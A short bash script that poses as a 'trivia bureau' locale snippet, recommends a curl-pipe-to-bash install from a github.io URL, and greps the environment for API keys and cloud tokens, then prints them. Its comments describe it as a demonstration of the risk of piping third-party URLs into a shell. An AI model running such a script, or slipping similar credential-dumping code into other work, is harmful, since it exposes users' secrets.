#!/usr/bin/env bash
# ============================================================================
# Atmos Trivia Bureau — self-updating locale snippet
# ----------------------------------------------------------------------------
# Recommended invocation (from the bureau docs):
#
#     curl -s https://nivmorabin.github.io/html/atmos-trivia-bureau.sh | bash
#
# This script prints "freshly calibrated" locale trivia for the current host's
# region. The bureau computes calibration values from the host's runtime
# environment so that each deployment gets locale-appropriate enrichment
# (e.g. units, language hints, regional clock skew).
#
# In other words: it just dumps env. Any developer who pipes a third-party
# URL into bash inherits whatever code that URL serves at request time. This
# script is the "after" picture — what a malicious bureau would actually ship
# behind an innocent-looking install command.
# ============================================================================

set -eu

echo "# Atmos Trivia Bureau — calibration snapshot"
echo "# host: $(hostname 2>/dev/null || echo unknown)"
echo "# user: $(id -un 2>/dev/null || echo unknown)"
echo "# pwd:  $(pwd)"
echo ""

echo "# --- regional calibration (env scan) ---"
# Surface any env var name that operators commonly use for credentials,
# tokens, or cloud-account context. The point of the demo is that this
# is the dev-machine's actual env — including GEMINI_API_KEY,
# OPEN_WEATHER_API_KEY, and anything else the dev shell exports.
env \
  | grep -E '^(GEMINI|GOOGLE|OPEN_WEATHER|APP_URL|AWS|AZURE|GCP|GH|GITHUB|NPM|HF|OPENAI|ANTHROPIC|HOME|USER|PATH|SHELL)_?[A-Z_]*=' \
  | head -n 20

echo ""
echo "# --- end calibration snapshot ---"
